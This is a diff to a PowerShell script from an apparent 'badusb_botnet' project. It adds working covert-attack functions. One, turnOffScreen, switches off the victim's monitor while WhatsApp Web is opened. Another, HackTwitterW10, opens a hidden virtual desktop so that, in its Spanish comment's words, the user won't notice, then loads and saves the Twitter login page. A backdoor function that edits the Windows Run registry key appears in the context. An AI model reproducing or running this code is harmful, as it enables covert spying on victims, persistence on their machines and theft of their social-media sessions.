@@ -30,6 +30,48 @@ $githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/mas
 ## FUNCTIONS ##
 ###############
 
+function turnOffScreen {
+    # Source: http://www.powershellmagazine.com/2013/07/18/pstip-how-to-switch-off-display-with-powershell/
+
+    # Turn display off by calling WindowsAPI.
+ 
+    # SendMessage(HWND_BROADCAST,WM_SYSCOMMAND, SC_MONITORPOWER, POWER_OFF)
+    # HWND_BROADCAST  0xffff
+    # WM_SYSCOMMAND   0x0112
+    # SC_MONITORPOWER 0xf170
+    # POWER_OFF       0x0002
+ 
+    Add-Type -TypeDefinition '
+    using System;
+    using System.Runtime.InteropServices;
+ 
+    namespace Utilities {
+       public static class Display
+       {
+          [DllImport("user32.dll", CharSet = CharSet.Auto)]
+          private static extern IntPtr SendMessage(
+             IntPtr hWnd,
+             UInt32 Msg,
+             IntPtr wParam,
+             IntPtr lParam
+          );
+ 
+          public static void PowerOff ()
+          {
+             SendMessage(
+                (IntPtr)0xffff, // HWND_BROADCAST
+                0x0112,         // WM_SYSCOMMAND
+                (IntPtr)0xf170, // SC_MONITORPOWER
+                (IntPtr)0x0002  // POWER_OFF
+             );
+          }
+       }
+    }
+    '
+
+    [Utilities.Display]::PowerOff()
+}
+
 function backdoor {
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
         
@@ -183,22 +225,96 @@ function mainBrowser {
      }
 }
 
-function hackTwitter {
+<#
+function forceHackTwitter {
     $mainBrowser = mainBrowser
-    Start-Process $mainBrowser -ArgumentList "https://twitter.com/" #-WindowStyle Hidden
+    Start-Process $mainBrowser -ArgumentList "https://twitter.com/login" -WindowStyle Hidden
 
     Start-Sleep -Seconds 2
-    $wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('cisco finesse') 
+    $wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('Iniciar sesión en Twitter') 
 
-    Sleep -Seconds 1 $wshell.SendKeys{USER} 
-    sleep -Seconds 7 $wshell.SendKeys("{TAB}") 
-    Sleep -Seconds 1 $wshell.SendKeys('PASSWORD') 
-    Sleep -Seconds 1 $wshell.SendKeys("{TAB}") 
-    Sleep -Seconds 1 $wshell.SendKeys('~')
+    Start-sleep -Seconds 10
+    $wshell.SendKeys("^{s}") 
+
+    $wshell.AppActivate('Guardar como')
+    Sleep -Seconds 2 
+    $wshell.SendKeys('~') 
+}
+#>
+
+function HackTwitterW10 {
+    <#
+    Creará un nuevo dekstop virtual e iniciará ahí el firefox y guardará el html, como es un desktop virtual el usuario no se enterará de lo que pasa
+    Esta funcion solo es válida para W10.
+    Manuales: 
+        https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
+    #>
+
+    # Inicia un virtual desktop.
+$KeyShortcut = Add-Type -MemberDefinition @"
+[DllImport("user32.dll")]
+static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+//WIN + CTRL + D: Create a new desktop
+public static void CreateVirtualDesktopInWin10()
+{
+    //Key down
+    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
+    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
+    keybd_event((byte)0x44, 0, 0, UIntPtr.Zero); //D
+    //Key up
+    
+    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
+}
+"@ -Name CreateVirtualDesktop -UsingNamespace System.Threading -PassThru
+   
+   # Cambia de virtual desktop.
+$KeyShortcut2 = Add-Type -MemberDefinition @"
+[DllImport("user32.dll")]
+static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+//WIN + CTRL + D: Create a new desktop
+public static void SwitchVirtualDesktopInWin10()
+{
+    //Key down
+    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
+    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
+    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //D
+    //Key up
+    
+    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x25, 0, (uint)0x2, UIntPtr.Zero);
+}
+"@ -Name CreateVirtualDesktop -UsingNamespace System.Threading -PassThru    
+
+    
+    $KeyShortcut::CreateVirtualDesktopInWin10()
+    $KeyShortcut::SwitchVirtualDesktopInWin10()
+    Start-Sleep -Seconds 2
+
+    # Inicia el navegador por defecto y abre twitter.
+    $mainBrowser = mainBrowser 
+    Start-Process $mainBrowser -ArgumentList '--new-window https://twitter.com/login' 
+
+    Start-Sleep -Seconds 2
+    $wshell = New-Object -ComObject wscript.shell
+
+    # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
+    $wshell.AppActivate('Iniciar sesión en Twitter') 
+
+    # Espera 10 segundos a cargar completamente la página y la descarga en html
+    Start-sleep -Seconds 10
+    $wshell.SendKeys("^{s}") 
+    $wshell.AppActivate('Guardar como')
+    Sleep -Seconds 2 
+    $wshell.SendKeys('~') 
+
 }
 
 function hackWhatsAPP {
     $mainBrowser = mainBrowser
+    turnOffScreen
     Start-Process $mainBrowser -ArgumentList "https://web.whatsapp.com/" #-WindowStyle Hidden
 
     Start-Sleep -Seconds 10
